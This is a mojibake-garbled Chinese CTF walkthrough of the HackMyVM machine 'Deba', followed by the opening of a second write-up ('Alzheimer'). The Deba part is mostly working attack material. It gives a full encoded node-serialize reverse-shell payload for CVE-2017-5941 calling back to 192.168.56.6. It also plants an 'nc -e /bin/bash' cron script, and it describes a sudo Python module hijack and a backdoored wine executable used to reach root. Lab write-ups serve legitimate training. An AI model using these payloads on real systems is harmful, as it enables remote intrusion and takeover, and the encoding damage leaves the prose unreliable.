<br><a data-tooltip-position="top" aria-label="3. nodejsååºåˆ—åŒ– (CVE-2017-5941)" data-href="#3. nodejsååºåˆ—åŒ– (CVE-2017-5941)" href="https://www.c1trus.top/about:blank#3._nodejsååºåˆ—åŒ–_(CVE-2017-5941)" class="internal-link" target="_self" rel="noopener nofollow">3. nodejsååºåˆ—åŒ– (CVE-2017-5941)</a>
<br><a data-tooltip-position="top" aria-label="4. www-dataææƒlowç”¨æˆ·" data-href="#4. www-dataææƒlowç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._www-dataææƒlowç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. www-dataææƒlowç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="5. å®šæ—¶ä»»åŠ¡ææƒ" data-href="#5. å®šæ—¶ä»»åŠ¡ææƒ" href="https://www.c1trus.top/about:blank#5._å®šæ—¶ä»»åŠ¡ææƒ" class="internal-link" target="_self" rel="noopener nofollow">5. å®šæ—¶ä»»åŠ¡ææƒ</a>
<br><a data-tooltip-position="top" aria-label="6. wineå‘½ä»¤ ææƒroot" data-href="#6. wineå‘½ä»¤ ææƒroot" href="https://www.c1trus.top/about:blank#6._wineå‘½ä»¤_ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. wineå‘½ä»¤ ææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="6.1. åˆ©ç”¨CSè·å–root" data-href="#6.1. åˆ©ç”¨CSè·å–root" href="https://www.c1trus.top/about:blank#6.1._åˆ©ç”¨CSè·å–root" class="internal-link" target="_self" rel="noopener nofollow">6.1. åˆ©ç”¨CSè·å–root</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Deba" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Deba</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=nolose" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=nolose" target="_blank">nolose</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸<br>
å‚è€ƒæ–‡ç«  <a rel="noopener nofollow" class="external-link" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# nmap 192.168.56.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
Nmap scan report for 192.168.56.26
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds

<br>é¦–é¡µæ˜¯apache<br>
<img alt="Pasted image 20241227002954" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" referrerpolicy="no-referrer"><br>
3000ç«¯å£é¦–é¡µ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26:3000/
Hello World 
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt

Target: http://192.168.56.26/

[11:30:56] Starting:
[11:31:09] 301 -  321B  - /node_modules  -&gt;  http://192.168.56.26/node_modules/
[11:31:09] 200 -  992B  - /node_modules/
[11:31:09] 200 -  116B  - /package.json
[11:31:09] 200 -   32KB - /package-lock.json
[11:31:12] 200 -  386B  - /server.js

Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26:3000 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt

Target: http://192.168.56.26:3000/

[11:31:27] Starting:

Task Completed

<br>å‘ç°ä¸€ä¸ªnodejsçš„æºç <br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26//server.js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile,'base64').toString();
        var obj = serialize.unserialize(str);
    if (obj.username) {
        res.send("Hello " + escape(obj.username));
    }

    } else {
        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
res.send("Hello World");
});
app.listen(3000);
<br>
åˆ†æä»£ç å¯çŸ¥ è®¿é—® http://192.168.56.26:3000/ Web åº”ç”¨ç¨‹åºä¸­ä¼šæ£€æŸ¥å®¢æˆ·ç«¯è¯·æ±‚ä¸­æ˜¯å¦å¸¦æœ‰åä¸º profile çš„ Cookieï¼Œ<br>
å¦‚æœæœ‰ï¼Œåˆ™ä¼šå°†å…¶è§£ç ä¸º Base64 å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ serialize.unserialize å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œ<br>
ç”±äºCookieæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¶æ„cookieæ¥åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´
<br>æˆ‘ä»¬å¯ä»¥å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¿®æ”¹åå­—<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
{"username":"ajin","country":"india","city":"bangalore"} 

ä¿®æ”¹usernameçš„å€¼
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
Hello c1trus 
<br>å¯ä»¥å‘ç°ç¡®å®è¢«ä¿®æ”¹äº†<br>ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´ è¿›è¡Œåå¼¹shell<br>
è¿™é‡Œæœ‰ä¸€ä¸ªç°æˆçš„åå¼¹shellåˆ©ç”¨è„šæœ¬<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a><br><br>
è¿™é‡Œå…¶å®å°±æ˜¯åˆ©ç”¨çš„ <a data-tooltip-position="top" aria-label="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" rel="noopener nofollow" class="external-link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" target="_blank">CVE-2017-5941</a><br>
å¦‚æœæ„Ÿå…´è¶£ï¼Œè¿™é‡Œæœ‰åœ¨çº¿çš„<a data-tooltip-position="top" aria-label="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" rel="noopener nofollow" class="external-link" href="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" target="_blank">å…è´¹é¶åœº</a>è®©ä½ å¤ç°
<br>åˆ©ç”¨è„šæœ¬ç”Ÿæˆåå¼¹shellçš„payload<br>
æ³¨æ„ :è„šæœ¬è¦ç”¨python2è¿è¡Œ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# python2 nodejsshell.py 192.168.56.6 1234
[+] LHOST = 192.168.56.6
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
<br>ç„¶åå¯¹payloadè¿›è¡Œbase64ç¼–ç <br>æ„é€ åºåˆ—åŒ–ä»£ç <br>{"c1trus": "_$$ND_FUNC$$_function () { ä¸Šé¢ç”Ÿæˆçš„payload }()"}
<br>ç„¶åå¯¹è¿™ä¸ªæ„é€ å‡ºæ¥çš„payloadè¿›è¡Œbase64ç¼–ç <br>eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
<br>å¼€å¯ç›‘å¬ å¹¶ä½¿ç”¨è¿™ä¸ªpayloadä½œä¸ºcookieç„¶åè®¿é—®<br>curl http://192.168.56.26:3000/ -b "profile=base64åçš„payload"
<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# pwncat-cs -lp 1234

[03:51:04] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@debian:/var/www$ whoami
www-data

<br><br>(remote) www-data@debian:/home/low$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py

(remote) www-data@debian:/home/low/scripts$ ls -la
total 16
drwxr-xr-x 2 low      low      4096 may  7  2021 .
drwxr-xr-x 8 low      low      4096 may  7  2021 ..
-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
-rw-r--r-- 1 low      low        80 may  7  2021 script.py

(remote) www-data@debian:/home/low/scripts$ cat script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")

<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ low ç”¨æˆ·æ‰§è¡Œ script.py è€Œä¸” script.py å¼•å…¥äº† main.py æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯ä»¥ä¿®æ”¹è¿™ä¸ª main.py æ–‡ä»¶<br>ä¿®æ”¹ mian.py<br>(remote) www-data@debian:/home/low/scripts$ vi main.py
(remote) www-data@debian:/home/low/scripts$ cat main.py
from os import system as main
print("\n")
print("Just main")
main("whoami")
main("/bin/bash")

<br>sudoææƒ<br>(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py

low@debian:~/scripts$ whoami
low

low@debian:~$ cat user.txt
justdeserialize

<br><br>æˆ‘ä»¬ä½¿ç”¨ææƒè„šæœ¬è¿›è¡Œæ£€æµ‹å‘ç°å¯ä»¥åˆ©ç”¨çš„ç‚¹<br>*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" &gt;&gt; /home/debian/Documentos/log
<br>debian ç”¨æˆ·æ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ /home/debian/Documentos/backup/dissapeared.py<br>ä½†æ˜¯ backup/dissapeared.py å¹¶ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªå³å¯<br>low@debian:/home/debian/Documentos$  ls -la
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  600 dic 27 10:19 log
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ vi dissapeared.py
low@debian:/home/debian/Documentos$ cat dissapeared.py
import os
os.system("nc -e /bin/bash 192.168.56.6 2233")

<br>ç­‰å¾…åå¼¹å³å¯<br><br>(remote) debian@debian:/home/debian$ sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
    
(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe


<br>wine  ç®€å•æ¥è¯´å°±æ˜¯å…è®¸æˆ‘ä»¬åœ¨linuxä¸Šå…è®¸windowç¨‹åº<br>
æˆ‘ä»¬åªè¦å°† brainfuck.exe æ›¿æ¢æˆæˆ‘ä»¬çš„åé—¨ç¨‹åºå³å¯<br><br>noteè¿™é‡Œæˆ‘å…ˆç”¨msfè¯•ç€ç”Ÿæˆä¸€ä¸ªexeåé—¨ ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œwineæ‰§è¡Œåä¼šä¿å­˜<br>
ç„¶åç”¨CSç”Ÿæˆexeåé—¨å¯ä»¥è¿è¡Œä¸”ä¸ä¼šæŠ¥é”™<br>msfåé—¨æŠ¥é”™<br>(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000


<br>ä¸Šä¼ CSç”Ÿæˆçš„åé—¨<br>
ç„¶åè¿è¡Œå³å¯<br><img alt="Pasted image 20241227182208" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png" referrerpolicy="no-referrer"><br>
ä½†æ˜¯ç”±äºæ˜¯linuxè¿è¡Œwindowçš„åé—¨ï¼Œ å¥½åƒæ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œåæ­£æˆ‘æ²¡æœ‰æˆåŠŸ<br>
ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ–‡ä»¶æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–root.txt<br>ä½†æˆ‘è¿˜æ˜¯é€‰æ‹©å†™å…¬é’¥è¿›å»ç„¶åè¿æ¥<br>
<img alt="Pasted image 20241227182738" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png" referrerpolicy="no-referrer"><br>
æˆåŠŸæ‹¿ä¸‹root<br>â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.56.26
The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian:~# whoami
root
root@debian:~# cat /root/root.txt
BoFsavetheworld

<br>æœ€åï¼Œå…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ pwnkit æ¼æ´è¿›è¡Œå†…æ ¸ææƒ]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/48.deba.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ftpåŒ¿åç™»å½•" data-href="#3. ftpåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#3._ftpåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">3. ftpåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Alzheimer
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šæ­»é¢˜
<br>çŸ¥è¯†ç‚¹ï¼šknockå‘½ä»¤ã€SUIDææƒï¼ˆcapshï¼‰
<br><br>ç«¯å£æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:23 CST
Nmap scan report for 192.168.9.11
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
<br>å¯¹80 22è¿›è¡Œäº†é™åˆ¶<br><br>ftp 192.168.9.11
anonymous
<br>é‡Œé¢æœ‰ä¸€ä¸ª.secretnote.txt æ–‡ä»¶<br>æŸ¥çœ‹<br>cat .secretnote.txt 
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
